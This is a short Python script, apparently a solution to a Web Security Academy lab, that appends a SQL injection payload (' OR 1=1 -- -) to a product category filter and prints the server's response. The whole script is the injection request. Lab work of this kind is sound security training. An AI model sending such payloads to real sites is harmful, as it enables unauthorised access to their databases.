import requests
url = "https://0a7e002a035364f583a7ff5d00b200c5.web-security-academy.net/filter?category=Gifts"
payload = "'OR 1=1 -- -"
headers={
    "Cookie": "session=dvbIKTOV9yWsnE73xqFmtqvfC1Cq6JuU",
    "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
}
res=requests.get(url+payload,headers=headers)

print(res.status_code)
print(res.text)